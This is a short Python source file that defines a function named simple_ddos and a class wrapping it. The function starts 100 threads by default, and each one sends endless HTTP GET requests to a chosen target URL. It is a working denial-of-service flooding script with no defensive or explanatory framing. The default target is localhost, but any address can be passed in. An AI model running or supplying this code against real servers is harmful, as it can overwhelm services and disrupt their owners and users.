import requests as req, threading as thr
from abc import ABC



def simple_ddos(target: str = 'http://localhost:8000', out: bool = True, th_count: int = 100):
    def thread():
        try:
            while True:
                request = req.get(target)
                if out: print(request.status_code)
        except KeyboardInterrupt: print('exiting...'); exit()
    threads = {}
    for i in range(th_count):
        threads[i] = thr.Thread(target=thread)
        threads[i].start()







class ClassApi(ABC):
    def __init__(self):
        super().__init__()

    @staticmethod
    def simple_ddos(target: str = 'http://localhost:8000', 
                    out: bool = True, 
                    th_count: int = 100):
        return simple_ddos(target, out, th_count)


